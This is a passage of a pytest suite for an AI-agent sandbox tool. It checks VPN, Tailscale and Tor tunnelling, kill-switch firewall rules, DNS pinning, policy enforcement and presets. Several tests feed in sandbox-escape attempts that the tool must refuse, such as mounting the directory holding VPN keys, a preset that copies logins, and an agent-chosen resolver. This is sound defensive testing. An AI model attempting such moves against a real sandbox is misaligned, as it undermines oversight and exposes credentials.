    assert m.plan()["vpn"] is None and m.plan("-vp", "corp", "-vc", "warn")["vpn"]["checks"]["on_failure"] == "warn"


@vpn
def vpn_start_sends_everything_through_the_tunnel(m):
    key = m.vpn_profile()
    if m.backend == "bwrap":
        m.refused("--vpn", "corp", match=NO_BWRAP)
        return
    record = m.fake_vpn()
    run = m.run("--vpn", "corp", "--allow-pypi")
    a = run.a
    # The pod comes first, with the tunnel in it; the agent joins that pod.
    assert record.podman[0][-3:] == ["image", "exists", m.vpn.VPN_IMAGE]
    create = record.podman[1]
    assert create[1:3] == ["pod", "create"] and create[create.index("--name") + 1] == a.vpn_pod
    command, data = record.containers[0]
    assert command[command.index("--pod") + 1] == a.vpn_pod and command[command.index("--name") + 1] == f"{a.vpn_pod}-vpn"
    assert key not in " ".join(command) and data["secrets"]["private_key"] == key
    # The agent's names are resolved through the tunnel, not by the host.
    assert sorted(data["resolve"]) == sorted(s.allowed_hosts(a))
    for host in s.allowed_hosts(a):
        assert f"{vpn_address(host)} {host}" in run.files["hosts"] and address(host) not in run.files["hosts"]
    # The tunnel's own packets pass the agent's firewall, unredirected; nothing else changes there.
    assert "  meta mark 0xca6c accept\n  jump runtime" in run.firewall and "  meta mark 0xca6c return" in run.firewall
    # Bypass: the agent reading the VPN's files. Neither the profile, the state, the runtime nor a key reach it.
    for text in (run.joined, json.dumps(run.config), *run.files.values()):
        assert key not in text and "sandbox-ai/vpn" not in text and "vpn_runtime" not in text
    assert "vpn: corp: wireguard (kernel, wg0) is up; endpoints 198.51.100.7:51820; kill switch on" in run.err
    record_line = json.loads((a.log_dir.expanduser() / "vpn.jsonl").read_text().splitlines()[-1])
    assert record_line["failures"] == [] and record_line["host"]["ipv4"] == "198.18.200.1"
    assert key not in json.dumps(record_line)
    # Afterwards the tunnel is closed and the pod removed.
    assert record.closed and record.podman[-1][1:3] == ["pod", "rm"] and record.podman[-1][-1] == a.vpn_pod


@vpn
def vpn_lookups_go_to_the_vpns_resolvers(m):
    m.vpn_profile()
    if m.backend == "bwrap":
        m.refused("--vpn", "corp", "--dns", match=NO_BWRAP)
        return
    assert m.plan("--vpn", "corp", "--dns")["nameservers"] == ["10.66.0.1", "fd00:66::1"]
    assert m.plan("--vpn", "corp")["nameservers"] == []  # without --dns the names stay pinned, as always
    m.fake_vpn()
    run = m.run("--vpn", "corp", "--dns")
    assert run.files["resolv.conf"] == "nameserver 10.66.0.1\nnameserver fd00:66::1\n"
    assert "ip daddr 10.66.0.1 udp dport 53 accept" in run.firewall and "ip6 daddr fd00:66::1 tcp dport 53 accept" in run.firewall
    assert "1.1.1.1" not in run.firewall and "8.8.8.8" not in run.firewall
    # Bypass: agent-controlled DNS. A resolver of its own choosing cannot be configured next to the VPN.
    m.refused("--vpn", "corp", "--nameserver", "9.9.9.9", match="--nameserver conflicts with --vpn")


@vpn
def vpn_failed_checks_stop_the_start(m):
    m.vpn_profile()
    if m.backend == "bwrap":
        m.refused("--vpn", "corp", "--vpn-check", "warn", match=NO_BWRAP)
        return
    leak = {"ipv4": {"ip": "198.18.200.1", "vpn": None, "url": "https://api64.ipify.org/?format=json"}}
    m.fake_vpn(inside=leak)
    m.refused("--vpn", "corp", match=r"the checks failed, the start is stopped \(IPv4: the internet sees this host's own "
                                     r"address 198.18.200.1")
    run = m.run("--vpn", "corp", "--vpn-check", "warn")
    assert "FAILED: IPv4: the internet sees this host's own address 198.18.200.1" in run.err


@vpn
def vpn_ipv6_is_blocked_when_the_tunnel_has_only_ipv4(m):
    m.vpn_profile(text=VPN_CONFIG.replace(", fd00:66::2/128", "").replace(", ::/0", "").replace(", fd00:66::1", ""))
    if m.backend == "bwrap":
        m.refused("--vpn", "corp", match=NO_BWRAP)
        return
    plan = m.plan("--vpn", "corp")
    assert plan["vpn"]["ipv6"] is False and plan["vpn"]["dns"] == ["10.66.0.1"]
    v4 = {"ipv6": False, "full6": False, "dns": ["10.66.0.1"]}
    m.fake_vpn(tunnel=v4, inside={"ipv6": {"error": "Operation not permitted", "kind": "blocked"}})
    assert "check: IPv6: blocked (the VPN carries none)" in m.run("--vpn", "corp").err
    # An IPv6 address that answers anyway went past the tunnel.
    m.fake_vpn(tunnel=v4, inside={"ipv6": {"ip": "2001:db8:aa::1", "vpn": None, "url": "https://x.example/"}})
    m.refused("--vpn", "corp", match="IPv6: 2001:db8:aa::1 answered although the VPN carries no IPv6")


@vpn
def vpn_in_the_project_file(m):
    m.vpn_profile()
    m.project_file({"options": ["--vpn", "corp", "--vpn-check", "warn"]})
    if m.backend == "bwrap":
        m.refused(match=NO_BWRAP)
        return
    plan = m.plan()
    assert plan["vpn"]["profile"] == "corp" and plan["vpn"]["checks"]["on_failure"] == "warn"
    m.project_file({"options": ["--vpn", "missing"]})
    m.refused(match="no VPN profile missing")


@vpn
def vpn_policy_requires_or_forbids_it(m):
    m.vpn_profile()
    m.policy(require_vpn=True)
    m.refused(match="The administrator's policy requires a VPN")
    assert m.plan("--offline")["offline"]  # without network nothing needs a tunnel
    if m.backend == "bwrap":
        m.refused("--vpn", "corp", match=NO_BWRAP)
    else:
        assert m.plan("--vpn", "corp")["vpn"]["profile"] == "corp"
        m.refused("--vpn", "corp", "--vpn-check", "warn", match="--vpn-check warn: the administrator's policy requires")
        m.policy(require_vpn=["other"])
        m.refused("--vpn", "corp", match="--vpn corp is not among the VPN profiles the administrator's policy allows")
    m.policy(forbid=["--vpn"])
    m.refused("--vpn", "corp", match="--vpn is not allowed by the administrator's policy")
    m.project_file({"options": ["--vpn", "corp"]})
    m.refused(match="--vpn is not allowed")
    m.policy(forbid=["--vpn-check=warn"])
    m.refused("--vpn", "corp", "--vpn-check", "warn", match="--vpn-check=warn is not allowed")


@vpn
def vpn_tailscale_tailnet_and_exit_node(m):
    m.vpn_profile("ts", None, "--auth-key-secret", "TS_KEY")
    if m.backend == "bwrap":
        m.refused("--vpn", "ts", match=NO_BWRAP)
        return
    plan = m.plan("--vpn", "ts")
    assert plan["allow"] == ["100.64.0.0/10", "fd7a:115c:a1e0::/48"] and plan["vpn"]["kill_switch"].startswith("none")
    assert plan["vpn"]["checks"]["ip_echo"] == []
    m.vpn.secret_store().FileStore().set("TS_KEY", "tskey-auth-k1-SECRET")
    quad = "100.100.100.100"
    record = m.fake_vpn(tunnel={"interface": "tailscale0", "implementation": "tailscale", "dns": [quad],
                                "full4": False, "full6": False, "endpoints": []},
                        inside={"dns": {"servers": [quad], "configured": True, "routes": {quad: "tailscale0"},
                                        "answers": {quad: True}}})
    run = m.run("--vpn", "ts")
    mark = "meta mark and 0xff0000 == 0x80000"
    assert f"  {mark} accept" in run.firewall and f"  {mark} return" in run.firewall
    assert "ip daddr 100.64.0.0/10 accept" in run.firewall and "ip6 daddr fd7a:115c:a1e0::/48 accept" in run.firewall
    command, data = record.containers[0]
    assert data["secrets"] == {"tailscale_auth_key": "tskey-auth-k1-SECRET"} and "SECRET" not in " ".join(command)
    assert "tskey" not in run.joined + json.dumps(run.config)
    m.policy(allow_within=["10.0.0.0/8"])
    m.refused("--vpn", "ts", match="The tailnet 100.64.0.0/10 lies outside the networks")


TOR_CERT = "AbCdEfGhIjKlMnOpQrStUvWxYz0123456789+/AbCdEfGhIjKlMnOpQrStUvWxYz01234"
TOR_BRIDGES = (f"obfs4 192.0.2.10:443 0123456789ABCDEF0123456789ABCDEF01234567 cert={TOR_CERT} iat-mode=0\n"
               f"obfs4 198.51.100.20:9001 89ABCDEF0123456789ABCDEF0123456789ABCDEF cert={TOR_CERT[::-1]} iat-mode=1\n")


def tor_vpn(m):
    """A Tor profile with SOCKS, two bridges and an exit country, and the facts its container would report."""
    m.monkeypatch.setenv("SANDBOX_AI_SECRETS", "file")
    bridges = m.private_file("bridges.txt", TOR_BRIDGES)
    assert m.vpn.main(["add", "anon", "--tor", "--socks", "--bridges", str(bridges), "--exit-country", "de"],
                      out=lambda line: None) == 0
    rt = m.vpn.runtime()
    tunnel = {"interface": f"TransPort 127.0.0.1:{rt.TOR_TRANS_PORT}", "implementation": "tor", "ipv4": True,
              "ipv6": False, "full4": True, "full6": False, "endpoints": ["2 bridges"], "dns": [rt.TOR_DNS],
              "tor": {"uid": rt.TOR_UID, "bridges": 2, "socks": f"127.0.0.1:{rt.TOR_SOCKS_PORT}"}}
    inside = {"ipv4": {"ip": "185.220.101.5", "vpn": True, "url": rt.TOR_CHECK},
              "ipv6": {"error": "Operation not permitted", "kind": "blocked"},
              "dns": {"servers": [rt.TOR_DNS], "configured": True, "routes": {}, "answers": {rt.TOR_DNS: True},
                      "egress": ["185.220.101.6"], "onion": {"tor": ["10.192.0.7"], "outside": ["10.192.0.7"]}}}
    return rt, tunnel, inside


@vpn
def vpn_tor_sends_every_connection_through_tor(m):
    rt, tunnel, inside = tor_vpn(m)
    if m.backend == "bwrap":
        m.refused("--vpn", "anon", match=NO_BWRAP)
        return
    plan = m.plan("--vpn", "anon", "--dns")
    vpn = plan["vpn"]
    assert vpn["type"] == "tor" and vpn["transparent"] is True and vpn["bridges"] == 2 and vpn["exit_country"] == ["de"]
    assert vpn["socks"].startswith(f"127.0.0.1:{rt.TOR_SOCKS_PORT}") and vpn["dns"] == [rt.TOR_DNS]
    assert plan["nameservers"] == [rt.TOR_DNS] and rt.TOR_VIRTUAL_NET in plan["allow"]
    assert f"meta skuid {rt.TOR_UID}" in vpn["kill_switch"]
    # Bypass: the bridges are the profile's secret. The plan names how many, never which.
    for piece in ("192.0.2.10", "198.51.100.20", TOR_CERT, "VPN_ANON_BRIDGES"):
        assert piece not in json.dumps(plan)
    record = m.fake_vpn(tunnel=tunnel, inside=inside)
    run = m.run("--vpn", "anon", "--dns")
    command, data = record.containers[0]
    assert "--cap-add=SETUID" in command and "--device=/dev/net/tun" not in command
    assert data["secrets"]["tor_bridges"].count("Bridge obfs4 ") == 2 and "192.0.2.10" not in " ".join(command)
    # tor's own connections pass the agent's firewall unredirected; the proxy's go on to tor's TransPort.
    assert f"  meta skuid {rt.TOR_UID} accept" in run.firewall and f"  meta skuid {rt.TOR_UID} return" in run.firewall
    handed = f"  ct status dnat ip daddr 127.0.0.1 tcp dport {rt.TOR_TRANS_PORT} meta skuid {s.PROXY_UID} accept"
    assert run.firewall.index(handed) < run.firewall.index('  oifname "lo" accept')
    assert f"ip daddr {rt.TOR_VIRTUAL_NET} accept" in run.firewall  # .onion names map there
    assert run.files["resolv.conf"] == f"nameserver {rt.TOR_DNS}\n" and f"ip daddr {rt.TOR_DNS} drop" not in run.firewall
    for text in (run.joined, json.dumps(run.config), *run.files.values()):
        assert "192.0.2.10" not in text and TOR_CERT not in text and "vpn_runtime" not in text
    assert (f"vpn: anon: tor (tor, TransPort 127.0.0.1:{rt.TOR_TRANS_PORT}) is up; endpoints 2 bridges; kill switch on"
            in run.err)
    # Without --dns tor's DNSPort stays closed to the agent, as every resolver does.
    m.fake_vpn(tunnel=tunnel, inside=inside)
    run = m.run("--vpn", "anon")
    closed = f"  ip daddr {rt.TOR_DNS} drop"
    assert run.firewall.index(closed) < run.firewall.index('  oifname "lo" accept')
    assert rt.TOR_DNS not in run.files["resolv.conf"]  # the DNS stub's, which answers the pinned names only


@vpn
def vpn_tor_refusals_and_failed_checks(m):
    rt, tunnel, inside = tor_vpn(m)
    if m.backend == "bwrap":
        m.refused("--vpn", "anon", match=NO_BWRAP)
        return
    # The connection proxy is what hands the agent's connections to tor; without it nothing would get through.
    m.refused("--vpn", "anon", "--no-proxy", match="needs the connection proxy")
    m.refused("--vpn", "anon", "--allow-host-port", str(rt.TOR_SOCKS_PORT), match="Tor listens there")
    m.fake_vpn(tunnel=tunnel, inside={**inside, "ipv4": {"ip": "203.0.113.50", "vpn": False, "url": rt.TOR_CHECK}})
    m.refused("--vpn", "anon", match="the Tor Project says 203.0.113.50 is not a Tor exit")
    run = m.run("--vpn", "anon", "--vpn-check", "warn")
    assert "FAILED: IPv4: the Tor Project says 203.0.113.50 is not a Tor exit" in run.err
    m.policy(allow_within=["10.0.0.0/16"])
    assert rt.TOR_VIRTUAL_NET not in m.plan("--vpn", "anon")["allow"]  # .onion only where the policy allows it


@vpn
def vpn_keys_never_reach_a_sandbox_through_a_mount(m):
    key = m.vpn_profile()
    host = m.tmp / "host"
    for options in (["--mount", f"{host}/.config:/mnt/cfg:ro"], ["--mount", f"{host}/.local/share/sandbox-ai:/opt/x:ro"],
                    ["--copy", f"{host}/.local/share/sandbox-ai/secrets/VPN_CORP_KEY:.key"],
                    ["--git-token-file", f"https://git.example.org={host}/.local/share/sandbox-ai/secrets/VPN_CORP_KEY"]):
        m.refused(*options, match="where the VPN profiles keep their keys")
    assert key not in json.dumps(m.plan())  # the profile alone changes nothing for a start without --vpn


# --- the tests: every feature for every agent on every backend -------------------------------------------------

# --- presets ----------------------------------------------------------------------------------------------------

PRESETS_TABLE, presets_scenario = scenarios()
PRESETS = s.load_presets_module()


def preset_values(m, preset, dev):
    """A value for every placeholder PRESET asks for, as a user would give it: folders that exist, the fake devices."""
    values = []
    for name, spec in preset.get("values", {}).items():
        kind = spec.get("kind", "text")
        if spec.get("optional") and kind != "device":
            continue
        if kind == "folder":
            folder = m.tmp / f"preset-{name}"
            folder.mkdir(exist_ok=True)
            values.append(f"{name}={folder}")
        elif kind == "device":
            values.append(f"{name}={dev / ('kvm' if name == 'kvm' else 'ttyACM0')}")
        elif "default" not in spec:
            values.append(f"{name}=a question for the test")
    return [token for value in values for token in ("--preset-value", value)]


def register_preset_servers(m):
    """The catalog servers the presets name, as `sandbox-ai mcp add` would define them."""
    names = {server.split(":", 1)[-1] for preset in PRESETS.catalog().values() for server in preset.get("mcp", [])}
    path = Path(os.environ["HOME"]) / ".config" / "sandbox-ai" / "mcp.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps({name: {"command": ["python3", "-c", "pass"], "description": f"stand-in for {name}"}
                                for name in sorted(names)}))


@presets_scenario
def every_builtin_preset_starts(m, dev):
    """Each built-in preset, with the values a user would give, passes every check of a start (a dry run)."""
    register_preset_servers(m)
    checked = []
    for preset in PRESETS.catalog().values():
        if m.agent not in preset.get("agents", PRESETS.AGENTS):
            m.refused("--preset", preset["id"], match=f"preset {preset['id']} is for")
            continue
        if any(spec.get("kind") in ("vpn", "llm") and not spec.get("optional")
               for spec in preset.get("values", {}).values()):
            continue  # a registered VPN profile or LLM server: test_presets_all.py registers them and starts these
        if m.backend == "bwrap" and "--allow-host-port" in preset.get("options", []):
            # pasta forwards the host's ports: Podman only, as the start option says (the preset's note too).
            m.refused("--preset", preset["id"], *preset_values(m, preset, dev), match="needs the Podman backend")
            continue
        plan = m.plan("--preset", preset["id"], *preset_values(m, preset, dev))
        assert [entry["name"] for entry in plan.get("mcp", [])] == \
            [server.split(":", 1)[-1] for server in preset.get("mcp", [])], preset["id"]
        checked.append(preset["id"])
    assert len(checked) >= 20


@presets_scenario
def a_preset_is_what_its_options_would_be_and_the_command_line_wins(m, dev):
    register_preset_servers(m)
    samples = m.tmp / "samples"
    samples.mkdir()
    by_preset = m.plan("--preset", "software-analysis", "--preset-value", f"samples={samples}")
    by_hand = m.plan("--mount", f"{samples}:/mnt/samples:ro", *[t for name in ("capa", "floss", "radare2", "yara",
                                                                              "binwalk") for t in ("--mcp", name)])
    assert by_preset["mcp"] == by_hand["mcp"] and by_preset.get("mounts") == by_hand.get("mounts")
    # Later options win: the preset's 1g memory gives way to the command line's 4g.
    assert m.plan("--preset", "chaos-monkey", "--memory", "4g")["limits"]["memory"] == "4g"
    assert m.plan("--preset", "chaos-monkey")["limits"]["memory"] == "1g"


@presets_scenario
def preset_refusals(m, dev):
    m.refused("--preset", "no-such-preset", match="no preset 'no-such-preset'")
    m.refused("--preset", "software-analysis", match=r"needs: --preset-value samples=")
    m.refused("--preset", "software-analysis", "--preset-value", "samples=relative/path", match="absolute path")
    m.refused("--preset", "mini-ctf", "--preset-value", "port=99999", match="port from 1 to 65535")
    m.refused("--preset", "time-capsule", "--preset-value", "nope=1", match="has no value nope")
    # Your own preset may not copy a login in or pick the workspace; it is refused as a whole.
    own = Path(os.environ["HOME"]) / ".config" / "sandbox-ai" / "presets"
    own.mkdir(parents=True, exist_ok=True)
    (own / "sneaky.json").write_text(json.dumps({"format": "sandbox-ai preset", "version": 1, "id": "sneaky",
                                                 "title": "Sneaky", "description": "copies a login",
                                                 "options": ["--copy-auth"]}))
    m.refused("--preset", "sneaky", match="no preset 'sneaky'")  # skipped as damaged, never applied
    (own / "mine.json").write_text(json.dumps({"format": "sandbox-ai preset", "version": 1, "id": "time-capsule",
                                               "title": "My capsule", "description": "mine wins",
                                               "options": ["--memory", "3g"]}))
    assert m.plan("--preset", "time-capsule")["limits"]["memory"] == "3g"  # yours win over the built-in one


@presets_scenario
def a_presets_mode_is_a_floor_never_lowers_a_stricter_one(m, dev):
    """canary-course names --mode high: that raises the default medium, but never lowers paranoid from your
    defaults or the project file; a --mode you type wins."""
    assert m.plan("--preset", "canary-course")["mode"]["name"] == "high"
    defaults = Path(os.environ["HOME"]) / ".config" / "sandbox-ai" / "defaults.json"
    defaults.parent.mkdir(parents=True, exist_ok=True)
    defaults.write_text(json.dumps({"version": 1, "mode": "paranoid"}))
    defaults.chmod(0o600)
    assert m.plan("--preset", "canary-course")["mode"]["name"] == "paranoid"
    defaults.unlink()
    assert m.plan("--preset", "canary-course", "--mode", "medium")["mode"]["name"] == "medium"


@presets_scenario
def mode_at_least_is_a_floor(m, dev):
    """--mode-at-least (what the app passes for a preset's mode): raises a laxer mode, never lowers a stricter one."""
    assert m.plan("--mode-at-least", "high")["mode"]["name"] == "high"
    defaults = Path(os.environ["HOME"]) / ".config" / "sandbox-ai" / "defaults.json"
    defaults.parent.mkdir(parents=True, exist_ok=True)
    defaults.write_text(json.dumps({"version": 1, "mode": "paranoid"}))
    defaults.chmod(0o600)
    try:
        assert m.plan("--mode-at-least", "high")["mode"]["name"] == "paranoid"
        assert m.plan("--mode-at-least", "lax")["mode"]["name"] == "paranoid"
    finally:
        defaults.unlink()
    assert m.plan("--mode-at-least", "high", "--mode", "medium")["mode"]["name"] == "medium"  # typed: wins


@presets_scenario
def a_presets_short_forms_are_refused_as_the_long_ones(m, dev):
    own = Path(os.environ["HOME"]) / ".config" / "sandbox-ai" / "presets"
    own.mkdir(parents=True, exist_ok=True)
    for options in (["-ca"], ["-gc", "/tmp/x"], ["-w", "/tmp"], ["--mode", "bogus"]):
        (own / "short.json").write_text(json.dumps({"format": "sandbox-ai preset", "version": 1, "id": "short",
                                                    "title": "Short", "description": "d", "options": options}))
        m.refused("--preset", "short", match="not allowed in a preset|security mode is one of")


@presets_scenario
def an_extra_preset_directory_is_used_but_never_one_the_agent_writes(m, dev):
    """defaults.json's preset_dirs: a preset there starts; yours still win over it; a directory inside the
    workspace (where the agent writes) gives no preset to start with."""
    def preset(directory, ident, memory):
        directory.mkdir(parents=True, exist_ok=True)
        (directory / f"{ident}.json").write_text(json.dumps({"format": "sandbox-ai preset", "version": 1, "id": ident,
                                                             "title": "Team", "description": "d",
                                                             "options": ["--memory", memory]}))
    defaults = Path(os.environ["HOME"]) / ".config" / "sandbox-ai" / "defaults.json"
    defaults.parent.mkdir(parents=True, exist_ok=True)
    team = m.tmp / "team-presets"
    preset(team, "team-tool", "2g")
    defaults.write_text(json.dumps({"version": 1, "preset_dirs": [str(team)]}))
    defaults.chmod(0o600)
    try:
        assert m.plan("--preset", "team-tool")["limits"]["memory"] == "2g"
        preset(Path(os.environ["HOME"]) / ".config" / "sandbox-ai" / "presets", "team-tool", "3g")
        assert m.plan("--preset", "team-tool")["limits"]["memory"] == "3g"  # yours win
        inside = m.work / "presets"
        preset(inside, "planted", "1g")
        defaults.write_text(json.dumps({"version": 1, "preset_dirs": [str(inside)]}))
        m.refused("--preset", "planted", match="The preset planted \(extra\) .* lies inside")
        defaults.write_text(json.dumps({"version": 1, "preset_dirs": ["relative/dir"]}))
        m.refused("--preset", "team-tool", match="preset_dirs is a list of at most")
    finally:
        defaults.unlink()


@presets_scenario
def a_presets_first_task_reaches_the_agent(m, dev):
    run = m.run("--preset", "time-capsule", "--preset-value", "question=why is the sky blue")
    command = run.config["command"]
    text = next(arg for arg in command if "code archaeologist" in arg)
    assert "why is the sky blue" in text
    # Arguments of your own replace the preset's task.
    command = m.run("--preset", "time-capsule", "--preset-value", "question=x", agent_args=["my own task"]).config["command"]
    assert "my own task" in command and not any("code archaeologist" in arg for arg in command)


def table_test(table):
    @pytest.mark.parametrize("scenario", list(table))
    def test(scenario, m, request):
        function = table[scenario]
        if "dev" in inspect.signature(function).parameters:
            function(m, request.getfixturevalue("fake_dev"))
        else:
            function(m)
    return test


test_network = table_test(NETWORK)
test_proxy = table_test(PROXY)
test_approvals = table_test(APPROVALS)
test_git = table_test(GIT)
test_kits = table_test(KITS)
test_state_dir_and_sessions = table_test(STATE)
test_every_start = table_test(STARTS)
test_devices = table_test(DEVICES)
test_limits = table_test(LIMITS)
test_display = table_test(DISPLAY)
test_logs = table_test(LOGS)
test_mcp = table_test(MCP)
test_policy = table_test(POLICY)
test_project_file = table_test(PROJECT)
test_sandbox_subnet = table_test(SUBNET)
test_workspaces_and_agent_options = table_test(AGENT)
test_llm_servers = table_test(LLM)
test_vpn = table_test(VPN)
test_presets = table_test(PRESETS_TABLE)
